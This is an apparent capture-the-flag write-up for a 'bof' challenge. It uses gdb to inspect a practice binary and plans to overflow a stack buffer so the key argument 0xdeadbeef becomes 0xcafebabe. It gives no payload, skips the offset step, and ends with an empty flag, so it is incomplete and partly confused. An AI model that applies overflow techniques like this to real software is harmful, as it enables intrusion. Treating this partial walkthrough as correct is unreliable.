# bof

1. Run bof under gdb  
```
$ gdb ./bof

```

2. Disassemble main function:
```
(gdb) disas main

Dump of assembler code for function main:
   0x0000068a <+0>:     push   %ebp
   0x0000068b <+1>:     mov    %esp,%ebp
   0x0000068d <+3>:     and    $0xfffffff0,%esp
   0x00000690 <+6>:     sub    $0x10,%esp
   0x00000693 <+9>:     movl   $0xdeadbeef,(%esp)
   0x0000069a <+16>:    call   0x62c <func>
   0x0000069f <+21>:    mov    $0x0,%eax
   0x000006a4 <+26>:    leave
   0x000006a5 <+27>:    ret
End of assembler dump.
```

3. The goal is to search for memory address of the stack pointer (ESP) which contains `key` variable and override it with `0xcafebabe`.
Set a breakpoint at `main + <16>` to see an address stored in `esp`.   
```
(gdb) break *main+16
(gdb) run
(gdb) print $esp
(gdb) x/x $esp
```

4. Now we have to find an adress of `overflowme` buffer from `func` function to know how many bytes need to be read in from the input to overflow `esp` content.

```
(gdb) disas func
```


You'll get the flag:  
```
FLAG: {}
```